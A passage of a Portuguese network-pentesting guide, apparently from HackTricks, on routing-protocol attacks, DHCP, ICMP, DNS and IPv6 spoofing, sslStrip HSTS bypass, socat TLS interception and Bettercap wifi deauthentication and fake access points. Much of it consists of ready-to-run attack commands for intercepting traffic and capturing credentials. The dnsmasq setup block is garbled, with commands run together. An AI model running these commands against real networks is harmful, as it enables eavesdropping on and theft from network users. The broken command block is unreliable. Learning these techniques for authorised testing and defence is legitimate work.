glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Três versões do Protocolo de Informação de Roteamento (RIP) são conhecidas: RIP, RIPv2 e RIPng. Datagramas são enviados para pares via porta 520 usando UDP pelo RIP e RIPv2, enquanto datagramas são transmitidos para a porta UDP 521 via multicast IPv6 pelo RIPng. O suporte para autenticação MD5 foi introduzido pelo RIPv2. Por outro lado, a autenticação nativa não é incorporada pelo RIPng; em vez disso, confia-se em cabeçalhos IPsec AH e ESP opcionais dentro do IPv6.

- **RIP e RIPv2:** A comunicação é feita através de datagramas UDP na porta 520.
- **RIPng:** Utiliza a porta UDP 521 para transmitir datagramas via multicast IPv6.

Observe que o RIPv2 suporta autenticação MD5, enquanto o RIPng não inclui autenticação nativa, confiando em cabeçalhos IPsec AH e ESP no IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** é um protocolo de roteamento dinâmico. **É um protocolo de vetor de distância.** Se não houver **autenticação** e configuração de interfaces passivas, um **intruso** pode interferir no roteamento EIGRP e causar **envenenamento de tabelas de roteamento**. Além disso, a rede EIGRP (em outras palavras, sistema autônomo) **é plana e não possui segmentação em zonas**. Se um **atacante injeta uma rota**, é provável que essa rota **se espalhe** por todo o sistema EIGRP autônomo.

Atacar um sistema EIGRP requer **estabelecer uma vizinhança com um roteador EIGRP legítimo**, o que abre muitas possibilidades, desde reconhecimento básico até várias injeções.

[**FRRouting**](https://frrouting.org/) permite implementar **um roteador virtual que suporta BGP, OSPF, EIGRP, RIP e outros protocolos.** Tudo o que você precisa fazer é implantá-lo no sistema do seu atacante e você pode realmente fingir ser um roteador legítimo no domínio de roteamento.

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) tem capacidades para interceptar transmissões EIGRP (Enhanced Interior Gateway Routing Protocol). Também permite a injeção de pacotes, que podem ser utilizados para alterar configurações de roteamento.

### OSPF

No protocolo Open Shortest Path First (OSPF), **a autenticação MD5 é comumente empregada para garantir comunicação segura entre roteadores**. No entanto, essa medida de segurança pode ser comprometida usando ferramentas como Loki e John the Ripper. Essas ferramentas são capazes de capturar e quebrar hashes MD5, expondo a chave de autenticação. Uma vez que essa chave é obtida, pode ser usada para introduzir novas informações de roteamento. Para configurar os parâmetros da rota e estabelecer a chave comprometida, as abas _Injection_ e _Connection_ são utilizadas, respectivamente.

- **Capturando e Quebrando Hashes MD5:** Ferramentas como Loki e John the Ripper são usadas para esse propósito.
- **Configurando Parâmetros de Rota:** Isso é feito através da aba _Injection_.
- **Definindo a Chave Comprometida:** A chave é configurada na aba _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Ferramenta para escanear tráfego de rede e encontrar vulnerabilidades
- Você pode encontrar algumas **mais informações sobre ataques de rede** [**aqui**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

O atacante configura todos os parâmetros de rede (GW, IP, DNS) do novo membro da rede enviando respostas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Verifique a [seção anterior](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste em enviar um pacote ICMP tipo 1 código 5 que indica que o atacante é a melhor maneira de alcançar um IP. Assim, quando a vítima quiser contatar o IP, enviará o pacote através do atacante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

O atacante irá resolver alguns (ou todos) os domínios que a vítima solicitar.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar seu próprio DNS com dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Gateways Locais

Múltiplas rotas para sistemas e redes frequentemente existem. Ao construir uma lista de endereços MAC dentro da rede local, use _gateway-finder.py_ para identificar hosts que suportam o encaminhamento IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, e mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Para resolução de host local quando as consultas DNS falham, sistemas Microsoft dependem de **Link-Local Multicast Name Resolution (LLMNR)** e do **NetBIOS Name Service (NBT-NS)**. Da mesma forma, **Apple Bonjour** e implementações de **Linux zero-configuration** utilizam **Multicast DNS (mDNS)** para descobrir sistemas dentro de uma rede. Devido à natureza não autenticada desses protocolos e sua operação sobre UDP, transmitindo mensagens, eles podem ser explorados por atacantes que visam redirecionar usuários para serviços maliciosos.

Você pode se passar por serviços que estão sendo procurados por hosts usando o Responder para enviar respostas falsas.\
Leia aqui mais informações sobre [como se passar por serviços com Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Os navegadores comumente utilizam o **protocolo Web Proxy Auto-Discovery (WPAD) para adquirir automaticamente as configurações de proxy**. Isso envolve buscar detalhes de configuração de um servidor, especificamente através de uma URL como "http://wpad.example.org/wpad.dat". A descoberta desse servidor pelos clientes pode ocorrer através de vários mecanismos:

- Através de **DHCP**, onde a descoberta é facilitada utilizando uma entrada de código especial 252.
- Por **DNS**, que envolve a busca por um nome de host rotulado como _wpad_ dentro do domínio local.
- Via **Microsoft LLMNR e NBT-NS**, que são mecanismos de fallback usados em casos onde as consultas DNS não têm sucesso.

A ferramenta Responder se aproveita desse protocolo agindo como um **servidor WPAD malicioso**. Ela utiliza DHCP, DNS, LLMNR e NBT-NS para enganar os clientes a se conectarem a ela. Para se aprofundar em como serviços podem ser impersonados usando o Responder [verifique isso](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP e dispositivos UPnP](spoofing-ssdp-and-upnp-devices.md)

Você pode oferecer diferentes serviços na rede para tentar **enganar um usuário** a inserir algumas **credenciais em texto simples**. **Mais informações sobre esse ataque em** [**Spoofing SSDP e Dispositivos UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Spoofing de Vizinhança IPv6

Esse ataque é muito semelhante ao ARP Spoofing, mas no mundo IPv6. Você pode fazer a vítima pensar que o IPv6 do GW tem o MAC do atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding de Anúncios de Roteador IPv6

Alguns sistemas operacionais configuram por padrão o gateway a partir dos pacotes RA enviados na rede. Para declarar o atacante como roteador IPv6, você pode usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing DHCP IPv6

Por padrão, alguns sistemas operacionais tentam configurar o DNS lendo um pacote DHCPv6 na rede. Assim, um atacante poderia enviar um pacote DHCPv6 para se configurar como DNS. O DHCP também fornece um IPv6 para a vítima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (página falsa e injeção de código JS)

## Ataques na Internet

### sslStrip

Basicamente, o que este ataque faz é, caso o **usuário** tente **acessar** uma página **HTTP** que está **redirecionando** para a versão **HTTPS**. O **sslStrip** irá **manter** uma **conexão HTTP com** o **cliente e** uma **conexão HTTPS com** o **servidor**, permitindo que ele **capture** a conexão em **texto simples**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mais informações [aqui](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ e dns2proxy para contornar HSTS

A **diferença** entre **sslStrip+ e dns2proxy** em relação ao **sslStrip** é que eles **redirecionarão** por exemplo _**www.facebook.com**_ **para** _**wwww.facebook.com**_ (note o **extra** "**w**") e definirão o **endereço deste domínio como o IP do atacante**. Dessa forma, o **cliente** irá **conectar-se** a _**wwww.facebook.com**_ **(o atacante)**, mas nos bastidores **sslstrip+** irá **manter** a **conexão real** via https com **www.facebook.com**.

O **objetivo** desta técnica é **evitar HSTS** porque _**wwww**.facebook.com_ **não será** salvo no **cache** do navegador, então o navegador será enganado para realizar a **autenticação do facebook em HTTP**.\
Note que, para realizar este ataque, a vítima deve tentar acessar inicialmente [http://www.faceook.com](http://www.faceook.com) e não https. Isso pode ser feito modificando os links dentro de uma página http.

Mais informações [aqui](https://www.bettercap.org/legacy/#hsts-bypass), [aqui](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) e [aqui](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ não funcionam mais. Isso se deve ao fato de que existem regras HSTS pré-salvas nos navegadores, então mesmo que seja a primeira vez que um usuário acesse um domínio "importante", ele o fará via HTTPS. Além disso, note que as regras pré-salvas e outras regras geradas podem usar a flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **então o** _**wwww.facebook.com**_ **exemplo de antes não funcionará mais, pois** _**facebook.com**_ **usa HSTS com `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP escutar na porta
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL escutar na porta

#### Gerar chaves e certificado autoassinado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Ouvir usando certificado
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Ouça usando certificado e redirecione para os hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Às vezes, se o cliente verificar que a CA é válida, você pode **servir um certificado de outro hostname assinado por uma CA**.\
Outro teste interessante é **servir um certificado do hostname solicitado, mas autoassinado**.

Outras coisas a testar são tentar assinar o certificado com um certificado válido que não seja uma CA válida. Ou usar a chave pública válida, forçar o uso de um algoritmo como Diffie-Hellman (um que não precise descriptografar nada com a verdadeira chave privada) e, quando o cliente solicitar uma prova da verdadeira chave privada (como um hash), enviar uma prova falsa e esperar que o cliente não verifique isso.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notas de Descoberta Ativa

Leve em consideração que quando um pacote UDP é enviado para um dispositivo que não possui a porta solicitada, um ICMP (Port Unreachable) é enviado.

### **Descoberta ARP**

Pacotes ARP são usados para descobrir quais IPs estão sendo utilizados dentro da rede. O PC deve enviar uma solicitação para cada possível endereço IP e apenas aqueles que estão sendo utilizados responderão.

### **mDNS (DNS multicast)**

Bettercap envia uma solicitação MDNS (a cada X ms) perguntando por **\_services\_.dns-sd.\_udp.local**. A máquina que vê este pacote geralmente responde a essa solicitação. Em seguida, ela apenas procura por máquinas que respondem a "services".

**Ferramentas**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap transmite pacotes para a porta 137/UDP perguntando pelo nome "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Protocolo de Descoberta de Serviços Simples)**

Bettercap transmite pacotes SSDP procurando por todo tipo de serviços (Porta UDP 1900).

### **WSD (Descoberta de Serviços Web)**

Bettercap transmite pacotes WSD procurando por serviços (Porta UDP 3702).

## Referências

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Avaliação de Segurança de Rede: Conheça Sua Rede (3ª edição)**
- **Hacking Prático de IoT: O Guia Definitivo para Atacar a Internet das Coisas. Por Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
